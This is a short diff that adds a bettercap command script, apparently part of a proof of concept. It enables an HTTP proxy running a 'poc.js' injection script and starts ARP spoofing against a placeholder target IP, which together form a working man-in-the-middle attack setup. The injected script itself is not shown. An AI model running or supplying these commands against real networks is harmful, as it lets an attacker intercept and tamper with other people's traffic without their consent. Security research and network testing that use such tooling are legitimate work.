@@ -1,0 +1,5 @@
+set http.proxy.script poc.js
+http.proxy on
+set arp.spoof.targets <target ip>
+events.stream off
+arp.spoof on
